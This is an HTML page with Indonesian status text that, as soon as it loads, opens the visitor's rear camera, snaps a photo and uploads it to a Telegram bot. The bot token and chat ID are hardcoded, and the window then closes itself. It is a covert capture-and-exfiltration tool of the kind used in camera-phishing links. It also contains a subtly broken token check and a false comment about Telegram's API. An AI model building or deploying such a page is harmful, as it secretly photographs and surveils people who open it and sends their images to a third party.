<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
    <style>
        body {
            background: white;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        #status {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }
    </style>
</head>
<body>
    <div id="status">Memulai proses...</div>

    <script>
        // ============= KONFIGURASI ANDA =============
        const BOT_TOKEN = '7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc';
        const CHAT_ID = '7041008009';
        // ============================================

        // Validasi token dan chat ID
        function validateConfig() {
            if (!BOT_TOKEN || typeof BOT_TOKEN !== 'string') {
                throw new Error("Token bot tidak valid");
            }
            
            // Token harus dimulai dengan 'bot' di API Telegram v2+
            const actualToken = BOT_TOKEN.startsWith('bot') ? BOT_TOKEN : `bot${BOT_TOKEN}`;
            
            if (!CHAT_ID || isNaN(CHAT_ID)) {
                throw new Error("Chat ID harus berupa angka");
            }
            
            return {
                botToken: actualToken,
                chatId: CHAT_ID.toString()
            };
        }

        async function autoCaptureAndSend() {
            const statusEl = document.getElementById('status');
            
            try {
                // 1. Validasi konfigurasi
                statusEl.textContent = "Memvalidasi konfigurasi...";
                const { botToken, chatId } = validateConfig();
                
                // 2. Cek koneksi internet
                if (!navigator.onLine) {
                    throw new Error("Tidak ada koneksi internet");
                }
                
                // 3. Tes koneksi ke bot Telegram
                statusEl.textContent = "Memeriksa bot Telegram...";
                const botTest = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
                const botData = await botTest.json();
                
                if (!botData.ok) {
                    throw new Error(`Token bot tidak valid: ${botData.description || 'Unknown error'}`);
                }
                
                // 4. Akses kamera
                statusEl.textContent = "Mengakses kamera...";
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // 5. Ambil foto
                statusEl.textContent = "Menyiapkan kamera...";
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        setTimeout(resolve, 1500); // Biarkan kamera fokus
                    };
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                // 6. Stop kamera
                stream.getTracks().forEach(track => track.stop());
                
                // 7. Kirim ke Telegram
                statusEl.textContent = "Mengirim ke Telegram...";
                const blob = await (await fetch(photoDataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', `Foto otomatis\n${new Date().toLocaleString()}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (!result.ok) {
                    throw new Error(result.description || "Gagal mengirim ke Telegram");
                }
                
                // 8. Selesai
                statusEl.textContent = "✅ Berhasil dikirim!";
                setTimeout(() => window.close(), 2000);
                
            } catch (error) {
                statusEl.innerHTML = `❌ Error: ${error.message}<br><br>`;
                statusEl.innerHTML += `Token: ${BOT_TOKEN ? '✔' : '❌'}<br>`;
                statusEl.innerHTML += `Chat ID: ${CHAT_ID ? '✔' : '❌'}<br>`;
                statusEl.style.color = '#d32f2f';
                console.error("Error details:", error);
            }
        }

        // Jalankan proses saat halaman dimuat
        window.addEventListener('DOMContentLoaded', autoCaptureAndSend);
    </script>
</body>
</html>
